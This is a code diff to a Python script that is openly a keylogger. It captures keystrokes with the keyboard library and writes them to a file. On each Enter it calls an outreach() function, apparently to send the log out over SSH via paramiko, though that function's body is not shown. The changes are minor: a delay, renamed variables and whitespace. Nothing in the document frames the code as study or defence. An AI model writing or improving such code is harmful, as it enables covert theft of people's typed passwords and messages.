@@ -1,5 +1,7 @@
 import os
 import string
+import time
+
 import keyboard
 import paramiko
 
@@ -35,23 +37,24 @@ def keylogger():
         event = keyboard.read_event()
 
         if event.event_type == keyboard.KEY_DOWN:
+            time.sleep(0.1)
             char = keyboard.read_key()
 
             if event.name == 'space':
-                char = ' '
-                file.write(char)
+                space = ' '
+                file.write(space)
                 file.close()
-            
+
             elif event.name == 'enter':
-                char = '\n'
-                file.write(char)
+                enter = '\n'
+                file.write(enter)
                 file.close()
                 outreach()
-                
+
             else:
                 file.write(char)
                 file.close()
-            
+
 
 
 if __name__ == '__main__':
